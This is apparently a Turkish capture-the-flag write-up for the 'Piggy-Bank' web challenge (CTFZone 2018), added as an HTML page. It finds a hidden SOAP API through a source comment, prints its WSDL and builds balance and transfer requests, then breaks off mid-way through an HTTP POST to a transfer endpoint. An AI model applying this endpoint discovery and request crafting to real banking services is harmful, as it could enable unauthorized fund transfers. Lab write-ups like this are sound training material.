@@ -1,0 +1,419 @@
+<!doctype html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    html {
+      max-width: 70ch;
+      margin: auto;
+      line-height: 1.75;
+      font-size: 1.25em;
+    }
+
+    pre {
+      overflow: auto;
+    }
+
+    nav ul {
+      background: #faca46;
+      text-align: center;
+    }
+
+    nav ul li {
+      display: inline-block;
+      color: white;
+      margin-right: 10px;
+    }
+
+    nav ul li a {
+      text-decoration: none;
+    }
+
+    img {
+      width: 100%;
+    }
+  </style>
+</head>
+
+<nav>
+  <ul>
+    <li><a href="/">Home</a></li>
+    <li><a href="https://github.com/i64">Git</a></li>
+  </ul>
+</nav><h1>Piggy-Bank - CTFZone 2018</h1>
+<pre style="background-color:#fdf6e3;"><code>
+<span style="color:#657b83;">Hack some bank for me.
+</span><span style="color:#657b83;">
+</span><span style="color:#657b83;">http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/home/
+</span>
+</code></pre>
+<p>Linke gidildigine karsimiza <strong>Piggy-Bank</strong> adinda bir banka cikiyor.</p>
+<p><img src="1.png" alt="" /></p>
+<p>Uye olundugunda <strong>For developers</strong> adinda daha aktif olmayan bir karsimiza cikiyor.
+<img src="2.png" alt="" /></p>
+<p>Fakat kaynak kodunda assagidaki ifadeleri gozlemleyebiliyoruz.</p>
+<pre style="background-color:#fdf6e3;" lang="html"><code>
+<span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">div </span><span style="color:#b58900;">class</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tab tab_5</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">Especially for pig-developers, we have the coolest api, which they will soon be able to use!</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">div</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">      </span><span style="color:#93a1a1;">&lt;!-- Link to the API (http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.wsdl.php) (Testing stage) --&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">div</span><span style="color:#93a1a1;">&gt;
+</span>
+</code></pre>
+<p>Bahsi gecen  <code>WSDL</code> sayfasina gidilince assagidaki <strong>WSDL</strong> formu karsimiza cikti.</p>
+<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<span style="color:#93a1a1;">&lt;?</span><span style="color:#268bd2;">xml </span><span style="color:#b58900;">version</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">1.0</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">encoding</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">utf-8</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">?&gt;
+</span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">wsdl:definitions </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">Bank</span><span style="color:#839496;">&quot;
+</span><span style="color:#b58900;">targetNamespace</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot;
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">xmlns:tns</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot;
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">xmlns:soap</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/wsdl/soap/</span><span style="color:#839496;">&quot;
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">xmlns:xsd</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://www.w3.org/2001/XMLSchema</span><span style="color:#839496;">&quot;
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">xmlns:soapenc</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot;
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">xmlns:wsdl</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/wsdl/</span><span style="color:#839496;">&quot;
+</span><span style="color:#657b83;">    </span><span style="color:#b58900;">xmlns</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/wsdl/</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">message </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">BalanceRequest</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">wallet_num</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">message</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">message </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">BalanceResponse</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">code</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">status</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:string</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">message</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">message </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">internalTransferRequest</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">receiver_wallet_num</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">sender_wallet_num</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">amount</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">token</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:string</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">message</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">message </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">internalTransferResponse</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">code</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">part </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">status</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:string</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">message</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">portType </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">BankServicePort</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">operation </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">requestBalance</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">input </span><span style="color:#b58900;">message</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tns:BalanceRequest</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">output </span><span style="color:#b58900;">message</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tns:BalanceResponse</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">operation</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">operation </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">internalTransfer</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">input </span><span style="color:#b58900;">message</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tns:internalTransferRequest</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">output </span><span style="color:#b58900;">message</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tns:internalTransferResponse</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">operation</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">portType</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">binding </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">BankServiceBinding</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tns:BankServicePort</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:binding </span><span style="color:#b58900;">style</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">rpc</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">transport</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/http</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">operation </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">requestBalance</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:operation </span><span style="color:#b58900;">soapAction</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:requestBalanceAction</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">input</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">                </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:body </span><span style="color:#b58900;">use</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">encoded</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">namespace</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">encodingStyle</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">input</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">output</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">                </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:body </span><span style="color:#b58900;">use</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">encoded</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">namespace</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">encodingStyle</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">output</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">operation</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">operation </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">internalTransfer</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:operation </span><span style="color:#b58900;">soapAction</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:internalTransferAction</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">input</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">                </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:body </span><span style="color:#b58900;">use</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">encoded</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">namespace</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">encodingStyle</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">input</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">output</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">                </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:body </span><span style="color:#b58900;">use</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">encoded</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">namespace</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">encodingStyle</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">output</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">operation</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">binding</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">wsdl:service </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">BankService</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">wsdl:port </span><span style="color:#b58900;">name</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">BankServicePort</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">binding</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">tns:BankServiceBinding</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">            </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soap:address </span><span style="color:#b58900;">location</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one/api/bankservice.php</span><span style="color:#839496;">&quot; </span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">wsdl:port</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">    </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">wsdl:service</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">wsdl:definitions</span><span style="color:#93a1a1;">&gt;
+</span>
+</code></pre>
+<p>Buna forma gore iki adet <code>SOAP API</code> endpointine sahip oldugumuzu ogrendik.</p>
+<p>Ilki bakiye sorgulama</p>
+<pre lang="xml" style="background-color:#fdf6e3;"><code>
+<span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soapenv:Envelope </span><span style="color:#b58900;">xmlns:xsi</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://www.w3.org/2001/XMLSchema-instance</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:xsd</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://www.w3.org/2001/XMLSchema</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:soapenv</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/envelope/</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:urn</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soapenv:Header</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soapenv:Body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">     </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">urn:requestBalance </span><span style="color:#b58900;">soapenv:encodingStyle</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">hesapNo</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">     </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">urn:requestBalance</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">soapenv:Body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">soapenv:Envelope</span><span style="color:#93a1a1;">&gt;
+</span>
+</code></pre>
+<p>İkincisi ise bakiye yollama</p>
+<pre style="background-color:#fdf6e3;" lang="xml"><code>
+<span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soapenv:Envelope </span><span style="color:#b58900;">xmlns:xsi</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://www.w3.org/2001/XMLSchema-instance</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:xsd</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://www.w3.org/2001/XMLSchema</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:soapenv</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/envelope/</span><span style="color:#839496;">&quot; </span><span style="color:#b58900;">xmlns:urn</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">urn:Bank</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soapenv:Header</span><span style="color:#93a1a1;">/&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">soapenv:Body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">     </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">urn:internalTransfer </span><span style="color:#b58900;">soapenv:encodingStyle</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">http://schemas.xmlsoap.org/soap/encoding/</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">receiver_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">aliciHesapNo</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">receiver_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">sender_wallet_num </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:decimal</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">fonderenHesapNo</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">sender_wallet_num</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">amount </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:float</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">miktar</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">amount</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">        </span><span style="color:#93a1a1;">&lt;</span><span style="color:#268bd2;">token </span><span style="color:#b58900;">xsi:type</span><span style="color:#657b83;">=</span><span style="color:#839496;">&quot;</span><span style="color:#2aa198;">xsd:string</span><span style="color:#839496;">&quot;</span><span style="color:#93a1a1;">&gt;</span><span style="color:#657b83;">token</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">token</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">     </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">urn:internalTransfer</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#657b83;">  </span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">soapenv:Body</span><span style="color:#93a1a1;">&gt;
+</span><span style="color:#93a1a1;">&lt;/</span><span style="color:#268bd2;">soapenv:Envelope</span><span style="color:#93a1a1;">&gt; 
+</span>
+</code></pre>
+<p>Ilk kosul(bakiye yollama) icin api token'e ihtiyac duyuyoruz. Buyuk ihtimal sorunun cozumu de bununla alakali olacagindan dolayi bunu kurcalamayabiliriz.</p>
+<pre style="background-color:#fdf6e3;" lang="http"><code>
+<span style="color:#657b83;">POST /home/transfer.php HTTP/1.1
+</span><span style="color:#657b83;">Host: web-05.v7frkwrfyhsjtbpfcppnu.ctfz.one
+</span><span style="color:#657b83;">User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0
